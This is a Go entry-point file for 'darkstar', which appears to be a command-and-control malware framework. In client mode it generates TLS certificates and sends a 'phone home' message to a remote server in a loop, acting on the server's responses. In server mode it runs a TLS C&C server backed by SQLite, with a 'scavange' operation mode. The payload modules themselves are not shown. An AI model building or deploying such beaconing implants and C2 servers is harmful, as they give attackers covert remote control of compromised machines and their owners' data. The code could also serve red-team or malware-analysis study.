package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/AlexsJones/darkstar/database"
	"github.com/AlexsJones/darkstar/net/client"
	"github.com/AlexsJones/darkstar/net/data"
	"github.com/AlexsJones/darkstar/net/server"
	"github.com/AlexsJones/darkstar/tls"
	"github.com/jinzhu/gorm"
	_ "github.com/jinzhu/gorm/dialects/sqlite"
)

func main() {
	var mode = flag.String("mode", "server", "Darkstar run mode")
	var clientPort = flag.Int("clientport", 8080, "Client port")
	var serverHostAddress = flag.String("serverhostaddress", "0.0.0.0", "Remote darkstar server address")
	var serverPort = flag.Int("serverport", 8080, "Server port")
	var serverMode = flag.String("servermode", "scavange", "Sets the remote C&C operation")
	var serverpath = flag.String("serverdbpath", "darkstar.db", "Set the sqlite3 database")
	flag.Parse()

	switch *mode {
	case "client":

		tlsConfiguration := &tls.Configuration{Host: "", ValidFrom: "", ValidFor: 365 * 24 * time.Hour, IsCA: false,
			RSABits: 2048, EcdsaCurve: "", CertPath: "client.pem", KeyPath: "client.key"}

		if err := tls.GenerateCertificates(tlsConfiguration); err != nil {
			os.Exit(1)
		}

		//Create the initial phone home message------------------------------------
		out := data.CreateMessage()
		//--------------------------------------------------------------------------
		config := &client.Configuration{
			Address: *serverHostAddress, CertPath: tlsConfiguration.CertPath, KeyPath: tlsConfiguration.KeyPath, Port: *clientPort, SleepTime: time.Second * 3}
		//Sends the initial client message
		for {
			r, n := client.Send(config, string(out))

			processedResponse, shouldSend := client.ResponseProcessor(r[:n])
			if shouldSend {
				log.Println("-------------------Parsed response from server and sending an update-------------------")
				client.Send(config, processedResponse)
			}
			time.Sleep(config.SleepTime)
		}

	default:
		// Connect to database ----------------------------------------------------
		db, err := gorm.Open("sqlite3", *serverpath)
		if err != nil {
			fmt.Println(err.Error())
			os.Exit(1)
		}
		defer db.Close()

		//Generate tables...
		database.AutoMigrate(db)
		// ------------------------------------------------------------------------
		// tls generate certs -----------------------------------------------------
		tlsConfiguration := &tls.Configuration{Host: "", ValidFrom: "", ValidFor: 365 * 24 * time.Hour, IsCA: false,
			RSABits: 2048, EcdsaCurve: "", CertPath: "server.pem", KeyPath: "server.key"}

		if err := tls.GenerateCertificates(tlsConfiguration); err != nil {
			os.Exit(1)
		}
		// ------------------------------------------------------------------------
		conf := &server.Configuration{Address: "0.0.0.0", CertPath: tlsConfiguration.CertPath, KeyPath: tlsConfiguration.KeyPath,
			Port:          *serverPort,
			ClientHandler: server.ClientHandler,
			ModuleName:    *serverMode,
			Database:      db,
		}
		if err := server.Run(conf); err != nil {
			log.Printf(err.Error())
		}
	}
}
